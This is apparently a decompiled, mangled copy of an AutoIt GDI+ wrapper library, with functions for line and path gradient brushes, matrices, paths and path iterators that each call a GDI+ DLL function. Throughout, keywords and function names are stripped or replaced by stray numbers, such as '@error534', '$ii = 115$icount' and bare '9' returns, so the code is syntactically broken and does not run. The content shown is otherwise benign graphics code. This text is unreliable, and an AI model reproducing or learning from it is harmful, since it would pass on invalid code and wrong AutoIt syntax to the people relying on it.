($tpointf1, 1, $nx1)
($tpointf1, 2, $ny1)
($tpointf2, 1, $nx2)
($tpointf2, 2, $ny2)
$aresult = ($__g_hgdipdll, "int", "GdipCreateLineBrush", "struct*", $tpointf1, "struct*", $tpointf2, "uint", $iargbclr1, "uint", $iargbclr2, "int", $iwrapmode, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[6]

_gdiplus_linebrushcreatefromrect($trectf, $iargbclr1, $iargbclr2, $igradientmode = 0, $iwrapmode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateLineBrushFromRect", "struct*", $trectf, "uint", $iargbclr1, "uint", $iargbclr2, "int", $igradientmode, "int", $iwrapmode, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[6]

_gdiplus_linebrushcreatefromrectwithangle($trectf, $iargbclr1, $iargbclr2, $fangle, $bisanglescalable = 39, $iwrapmode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateLineBrushFromRectWithAngle", "struct*", $trectf, "uint", $iargbclr1, "uint", $iargbclr2, "float", $fangle, "int", $bisanglescalable, "int", $iwrapmode, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[7]

_gdiplus_linebrushgetcolors($hlinegradientbrush)
$targbs, $aargbs[2], $aresult
$targbs = ("uint;uint")
$aresult = ($__g_hgdipdll, "uint", "GdipGetLineColors", "handle", $hlinegradientbrush, "struct*", $targbs)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aargbs[0] = ($targbs, 1)
$aargbs[1] = ($targbs, 2)
$aargbs

_gdiplus_linebrushgetrect($hlinegradientbrush)
$trectf = ($taggdiprectf)
$aresult = ($__g_hgdipdll, "int", "GdipGetLineRect", "handle", $hlinegradientbrush, "struct*", $trectf)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$arectf[4]
$ii = 1154
$arectf[$ii - 1] = ($trectf, $ii)

$arectf

_gdiplus_linebrushmultiplytransform($hlinegradientbrush, $hmatrix, $iorder = 0)
$aresult = ($__g_hgdipdll, "int", "GdipMultiplyLineTransform", "handle", $hlinegradientbrush, "handle", $hmatrix, "int", $iorder)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushresettransform($hlinegradientbrush)
$aresult = ($__g_hgdipdll, "int", "GdipResetLineTransform", "handle", $hlinegradientbrush)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushsetblend($hlinegradientbrush, $ablends)
$ii, $icount, $tfactors, $tpositions, $aresult
$icount = $ablends[0][0]
$tfactors = ("float[" & $icount & "]")
$tpositions = ("float[" & $icount & "]")
$ii = 115$icount
($tfactors, 1, $ablends[$ii][0], $ii)
($tpositions, 1, $ablends[$ii][1], $ii)

$aresult = ($__g_hgdipdll, "int", "GdipSetLineBlend", "handle", $hlinegradientbrush, "struct*", $tfactors, "struct*", $tpositions, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushsetcolors($hlinegradientbrush, $iargbstart, $iargbend)
$aresult = ($__g_hgdipdll, "int", "GdipSetLineColors", "handle", $hlinegradientbrush, "uint", $iargbstart, "uint", $iargbend)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushsetgammacorrection($hlinegradientbrush, $busegammacorrection = 39)
$aresult = ($__g_hgdipdll, "int", "GdipSetLineGammaCorrection", "handle", $hlinegradientbrush, "int", $busegammacorrection)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushsetlinearblend($hlinegradientbrush, $ffocus, $fscale = 1)
$aresult = ($__g_hgdipdll, "int", "GdipSetLineLinearBlend", "handle", $hlinegradientbrush, "float", $ffocus, "float", $fscale)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushsetpresetblend($hlinegradientbrush, $ainterpolations)
$ii, $icount, $tcolors, $tpositions, $aresult
$icount = $ainterpolations[0][0]
$tcolors = ("uint[" & $icount & "]")
$tpositions = ("float[" & $icount & "]")
$ii = 115$icount
($tcolors, 1, $ainterpolations[$ii][0], $ii)
($tpositions, 1, $ainterpolations[$ii][1], $ii)

$aresult = ($__g_hgdipdll, "int", "GdipSetLinePresetBlend", "handle", $hlinegradientbrush, "struct*", $tcolors, "struct*", $tpositions, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushsetsigmablend($hlinegradientbrush, $ffocus, $fscale = 1)
$aresult = ($__g_hgdipdll, "int", "GdipSetLineSigmaBlend", "handle", $hlinegradientbrush, "float", $ffocus, "float", $fscale)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_linebrushsettransform($hlinegradientbrush, $hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipSetLineTransform", "handle", $hlinegradientbrush, "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixcreate()
$aresult = ($__g_hgdipdll, "int", "GdipCreateMatrix", "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[1]

_gdiplus_matrixclone($hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipCloneMatrix", "handle", $hmatrix, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_matrixdispose($hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteMatrix", "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixgetelements($hmatrix)
$telements = ("float[6]")
$aresult = ($__g_hgdipdll, "int", "GdipGetMatrixElements", "handle", $hmatrix, "struct*", $telements)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aelements[6]
$ii = 1156
$aelements[$ii - 1] = ($telements, 1, $ii)

$aelements

_gdiplus_matrixinvert($hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipInvertMatrix", "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixmultiply($hmatrix1, $hmatrix2, $iorder = 0)
$aresult = ($__g_hgdipdll, "int", "GdipMultiplyMatrix", "handle", $hmatrix1, "handle", $hmatrix2, "int", $iorder)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixrotate($hmatrix, $fangle, $bappend = 40)
$aresult = ($__g_hgdipdll, "int", "GdipRotateMatrix", "handle", $hmatrix, "float", $fangle, "int", $bappend)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixscale($hmatrix, $fscalex, $fscaley, $border = 40)
$aresult = ($__g_hgdipdll, "int", "GdipScaleMatrix", "handle", $hmatrix, "float", $fscalex, "float", $fscaley, "int", $border)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixsetelements($hmatrix, $nm11 = 1, $nm12 = 0, $nm21 = 0, $nm22 = 1, $ndx = 0, $ndy = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetMatrixElements", "handle", $hmatrix, "float", $nm11, "float", $nm12, "float", $nm21, "float", $nm22, "float", $ndx, "float", $ndy)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixshear($hmatrix, $fshearx, $fsheary, $iorder = 0)
$aresult = ($__g_hgdipdll, "int", "GdipShearMatrix", "handle", $hmatrix, "float", $fshearx, "float", $fsheary, "int", $iorder)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_matrixtransformpoints($hmatrix, 36$apoints)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], ($ii - 1) * 2 + 1)
($tpoints, 1, $apoints[$ii][1], ($ii - 1) * 2 + 2)

$aresult = ($__g_hgdipdll, "int", "GdipTransformMatrixPoints", "handle", $hmatrix, "struct*", $tpoints, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
$ii = 115$icount
$apoints[$ii][0] = ($tpoints, 1, ($ii - 1) * 2 + 1)
$apoints[$ii][1] = ($tpoints, 1, ($ii - 1) * 2 + 2)

9

_gdiplus_matrixtranslate($hmatrix, $foffsetx, $foffsety, $bappend = 40)
$aresult = ($__g_hgdipdll, "int", "GdipTranslateMatrix", "handle", $hmatrix, "float", $foffsetx, "float", $foffsety, "int", $bappend)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_paramadd(36$tparams, $sguid, $inbofvalues, $itype, $pvalues)
$icount = ($tparams, "Count")
$pguid = ($tparams, "GUID") + ($icount * _gdiplus_paramsize())
$tparam = ($taggdipencoderparam, $pguid)
_winapi_guidfromstringex($sguid, $pguid)
($tparam, "Type", $itype)
($tparam, "NumberOfValues", $inbofvalues)
($tparam, "Values", $pvalues)
($tparams, "Count", $icount + 1)

_gdiplus_paraminit($icount)
$sstruct = $taggdipencoderparams
$i = 215$icount
$sstruct &= ";struct;byte[16];ulong;ulong;ptr;endstruct"

($sstruct)

_gdiplus_paramsize()
$tparam = ($taggdipencoderparam)
($tparam)

_gdiplus_pathaddarc($hpath, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathArc", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddbezier($hpath, $nx1, $ny1, $nx2, $ny2, $nx3, $ny3, $nx4, $ny4)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathBezier", "handle", $hpath, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2, "float", $nx3, "float", $ny3, "float", $nx4, "float", $ny4)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddclosedcurve($hpath, $apoints)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipAddPathClosedCurve", "handle", $hpath, "struct*", $tpoints, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddclosedcurve($hpath, $apoints, $ftension = 0.5)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipAddPathClosedCurve2", "handle", $hpath, "struct*", $tpoints, "int", $icount, "float", $ftension)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddcurve($hpath, $apoints)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipAddPathCurve", "handle", $hpath, "struct*", $tpoints, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddcurve($hpath, $apoints, $ftension = 0.5)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipAddPathCurve2", "handle", $hpath, "struct*", $tpoints, "int", $icount, "float", $ftension)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddcurve($hpath, $apoints, $ioffset, $inumofsegments, $ftension = 0.5)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipAddPathCurve3", "handle", $hpath, "struct*", $tpoints, "int", $icount, "int", $ioffset, "int", $inumofsegments, "float", $ftension)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddellipse($hpath, $nx, $ny, $nwidth, $nheight)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathEllipse", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddline($hpath, $nx1, $ny1, $nx2, $ny2)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathLine", "handle", $hpath, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddline($hpath, $apoints)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipAddPathLine2", "handle", $hpath, "struct*", $tpoints, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]5(10, $aresult[0], 40)
9

_gdiplus_pathaddpath($hpath1, $hpath2, $bconnect = 39)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathPath", "handle", $hpath1, "handle", $hpath2, "int", $bconnect)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddpie($hpath, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathPie", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddpolygon($hpath, $apoints)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipAddPathPolygon", "handle", $hpath, "struct*", $tpoints, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddrectangle($hpath, $nx, $ny, $nwidth, $nheight)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathRectangle", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathaddstring($hpath, $sstring, $tlayout, $hfamily, $istyle = 0, $fsize = 8.5, $hformat = 0)
$aresult = ($__g_hgdipdll, "int", "GdipAddPathString", "handle", $hpath, "wstr", $sstring, "int", -1, "handle", $hfamily, "int", $istyle, "float", $fsize, "struct*", $tlayout, "handle", $hformat)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushcreate($apoints, $iwrapmode = 0)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipCreatePathGradient", "struct*", $tpoints, "int", $icount, "int", $iwrapmode, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[4]

_gdiplus_pathbrushcreatefrompath($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipCreatePathGradientFromPath", "handle", $hpath, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_pathbrushgetcenterpoint($hpathgradientbrush)
$tpointf = ("float;float")
$aresult = ($__g_hgdipdll, "int", "GdipGetPathGradientCenterPoint", "handle", $hpathgradientbrush, "struct*", $tpointf)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$apointf[2]
$apointf[0] = ($tpointf, 1)
$apointf[1] = ($tpointf, 2)
$apointf

_gdiplus_pathbrushgetfocusscales($hpathgradientbrush)
$aresult = ($__g_hgdipdll, "int", "GdipGetPathGradientFocusScales", "handle", $hpathgradientbrush, "float*", 0, "float*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$ascales[2]
$ascales[0] = $aresult[2]
$ascales[1] = $aresult[3]
$ascales

_gdiplus_pathbrushgetpointcount($hpathgradientbrush)
$aresult = ($__g_hgdipdll, "int", "GdipGetPathGradientPointCount", "handle", $hpathgradientbrush, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pathbrushgetrect($hpathgradientbrush)
$trectf = ($taggdiprectf)
$aresult = ($__g_hgdipdll, "int", "GdipGetPathGradientRect", "handle", $hpathgradientbrush, "struct*", $trectf)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$arectf[4]
$ii = 1154
$arectf[$ii - 1] = ($trectf, $ii)

$arectf

_gdiplus_pathbrushgetwrapmode($hpathgradientbrush)
$aresult = ($__g_hgdipdll, "int", "GdipGetPathGradientWrapMode", "handle", $hpathgradientbrush, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pathbrushmultiplytransform($hpathgradientbrush, $hmatrix, $iorder = 0)
$aresult = ($__g_hgdipdll, "int", "GdipMultiplyPathGradientTransform", "handle", $hpathgradientbrush, "handle", $hmatrix, "int", $iorder)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushresettransform($hpathgradientbrush)
$aresult = ($__g_hgdipdll, "int", "GdipResetPathGradientTransform", "handle", $hpathgradientbrush)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetblend($hpathgradientbrush, $ablends)
$icount = $ablends[0][0]
$tfactors = ("float[" & $icount & "]")
$tpositions = ("float[" & $icount & "]")
$ii = 115$icount
($tfactors, 1, $ablends[$ii][0], $ii)
($tpositions, 1, $ablends[$ii][1], $ii)

$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientBlend", "handle", $hpathgradientbrush, "struct*", $tfactors, "struct*", $tpositions, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetcentercolor($hpathgradientbrush, $iargb)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientCenterColor", "handle", $hpathgradientbrush, "uint", $iargb)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetcenterpoint($hpathgradientbrush, $nx, $ny)
$tpointf = ("float;float")
($tpointf, 1, $nx)
($tpointf, 2, $ny)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientCenterPoint", "handle", $hpathgradientbrush, "struct*", $tpointf)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetfocusscales($hpathgradientbrush, $fscalex, $fscaley)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientFocusScales", "handle", $hpathgradientbrush, "float", $fscalex, "float", $fscaley)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetgammacorrection($hpathgradientbrush, $busegammacorrection)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientGammaCorrection", "handle", $hpathgradientbrush, "int", $busegammacorrection)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetlinearblend($hpathgradientbrush, $ffocus, $fscale = 1)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientLinearBlend", "handle", $hpathgradientbrush, "float", $ffocus, "float", $fscale)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetpresetblend($hpathgradientbrush, $ainterpolations)
$icount = $ainterpolations[0][0]
$tcolors = ("uint[" & $icount & "]")
$tpositions = ("float[" & $icount & "]")
$ii = 115$icount
($tcolors, 1, $ainterpolations[$ii][0], $ii)
($tpositions, 1, $ainterpolations[$ii][1], $ii)

$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientPresetBlend", "handle", $hpathgradientbrush, "struct*", $tcolors, "struct*", $tpositions, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetsigmablend($hpathgradientbrush, $ffocus, $fscale = 1)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientSigmaBlend", "handle", $hpathgradientbrush, "float", $ffocus, "float", $fscale)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetsurroundcolor($hpathgradientbrush, $iargb)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientSurroundColorsWithCount", "handle", $hpathgradientbrush, "uint*", $iargb, "int*", 1)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetsurroundcolorswithcount($hpathgradientbrush, $acolors)
$icount = $acolors[0]
$icolors = _gdiplus_pathbrushgetpointcount($hpathgradientbrush)
$icolors < $icount5$icount = $icolors
$tcolors = ("uint[" & $icount & "]")
$ii = 115$icount
($tcolors, 1, $acolors[$ii], $ii)

$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientSurroundColorsWithCount", "handle", $hpathgradientbrush, "struct*", $tcolors, "int*", $icount)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_pathbrushsettransform($hpathgradientbrush, $hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientTransform", "handle", $hpathgradientbrush, "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathbrushsetwrapmode($hpathgradientbrush, $iwrapmode)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathGradientWrapMode", "handle", $hpathgradientbrush, "int", $iwrapmode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathclone($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipClonePath", "handle", $hpath, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_pathclosefigure($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipClosePathFigure", "handle", $hpath)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathcreate($ifillmode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreatePath", "int", $ifillmode, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_pathcreate($apathdata, $ifillmode = 0)
$icount = $apathdata[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ttypes = ("byte[" & $icount & "]")
$ii = 115$icount
($tpoints, 1, $apathdata[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apathdata[$ii][1], (($ii - 1) * 2) + 2)
($ttypes, 1, $apathdata[$ii][2], $ii)

$aresult = ($__g_hgdipdll, "int", "GdipCreatePath2", "struct*", $tpoints, "struct*", $ttypes, "int", $icount, "int", $ifillmode, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[5]

_gdiplus_pathdispose($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipDeletePath", "handle", $hpath)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathflatten($hpath, $fflatness = 0.25, $hmatrix = 0)
$aresult = ($__g_hgdipdll, "int", "GdipFlattenPath", "handle", $hpath, "handle", $hmatrix, "float", $fflatness)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathgetdata($hpath)
$icount = _gdiplus_pathgetpointcount($hpath)
$tpathdata = ("int Count; ptr Points; ptr Types;")
$tpoints = ("float[" & $icount * 2 & "]")
$ttypes = ("byte[" & $icount & "]")
($tpathdata, "Count", $icount)
($tpathdata, "Points", ($tpoints))
($tpathdata, "Types", ($ttypes))
$aresult = ($__g_hgdipdll, "int", "GdipGetPathData", "handle", $hpath, "struct*", $tpathdata)
@error534(@error, @extended, 0)
$aresult[0]534($aresult[0], $aresult[0], -1)
$adata[$icount + 1][3]
$adata[0][0] = $icount
$ii = 115$icount
$adata[$ii][0] = ($tpoints, 1, (($ii - 1) * 2) + 1)
$adata[$ii][1] = ($tpoints, 1, (($ii - 1) * 2) + 2)
$adata[$ii][2] = ($ttypes, 1, $ii)

$adata

_gdiplus_pathgetfillmode($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipGetPathFillMode", "handle", $hpath, "int*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_pathgetlastpoint($hpath)
$tpointf = ("float;float")
$aresult = ($__g_hgdipdll, "int", "GdipGetPathLastPoint", "handle", $hpath, "struct*", $tpointf)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$apointf[2]
$apointf[0] = ($tpointf, 1)
$apointf[1] = ($tpointf, 2)
$apointf

_gdiplus_pathgetpointcount($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipGetPointCount", "handle", $hpath, "int*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_pathgetpoints($hpath)
$ii, $icount, $tpoints, $apoints[1][1], $aresult
$icount = _gdiplus_pathgetpointcount($hpath)
@error534(@error + 10, @extended, -1)
$tpoints = ("float[" & $icount * 2 & "]")
$aresult = ($__g_hgdipdll, "int", "GdipGetPathPoints", "handle", $hpath, "struct*", $tpoints, "int", $icount)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$apoints[$icount + 1][2]
$apoints[0][0] = $icount
$ii = 115$icount
$apoints[$ii][0] = ($tpoints, 1, (($ii - 1) * 2) + 1)
$apoints[$ii][1] = ($tpoints, 1, (($ii - 1) * 2) + 2)

$apoints

_gdiplus_pathgetworldbounds($hpath, $hmatrix = 0, $hpen = 0)
$trectf = ($taggdiprectf)
$aresult = ($__g_hgdipdll, "int", "GdipGetPathWorldBounds", "handle", $hpath, "struct*", $trectf, "handle", $hmatrix, "handle", $hpen)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$arectf[4]
$ii = 1154
$arectf[$ii - 1] = ($trectf, $ii)

$arectf

_gdiplus_pathisoutlinevisiblepoint($hpath, $nx, $ny, $hpen = 0, $hgraphics = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipIsOutlineVisiblePathPoint", "handle", $hpath, "float", $nx, "float", $ny, "handle", $hpen, "handle", $hgraphics, "int*", 0)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
$aresult[6] <> 0

_gdiplus_pathisvisiblepoint($hpath, $nx, $ny, $hgraphics = 0)
$aresult = ($__g_hgdipdll, "int", "GdipIsVisiblePathPoint", "handle", $hpath, "float", $nx, "float", $ny, "handle", $hgraphics, "int*", 0)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
$aresult[5] <> 0

_gdiplus_pathitercreate($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipCreatePathIter", "handle*", 0, "handle", $hpath)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[1]

_gdiplus_pathiterdispose($hpathiter)
$aresult = ($__g_hgdipdll, "int", "GdipDeletePathIter", "handle", $hpathiter)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathitergetsubpathcount($hpathiter)
$aresult = ($__g_hgdipdll, "int", "GdipPathIterGetSubpathCount", "handle", $hpathiter, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pathiternextmarkerpath($hpathiter, $hpath)
$aresult = ($__g_hgdipdll, "int", "GdipPathIterNextMarkerPath", "handle", $hpathiter, "int*", 0, "handle", $hpath)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pathiternextsubpathpath($hpathiter, $hpath)
$aresult = ($__g_hgdipdll, "int", "GdipPathIterNextSubpathPath", "handle", $hpathiter, "int*", 0, "handle", $hpath, "bool*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
